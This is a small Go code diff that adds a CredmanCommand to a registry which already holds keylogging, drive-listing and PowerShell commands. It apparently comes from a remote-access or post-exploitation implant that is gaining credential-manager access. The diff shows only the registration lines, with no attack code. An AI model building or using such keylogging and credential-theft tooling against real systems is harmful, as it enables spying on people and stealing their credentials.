@@ -33,4 +33,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&KeylogCommand{})
 	RegisterCommand(&DrivesCommand{})
 	RegisterCommand(&PowershellCommand{})
+	RegisterCommand(&CredmanCommand{})
 }
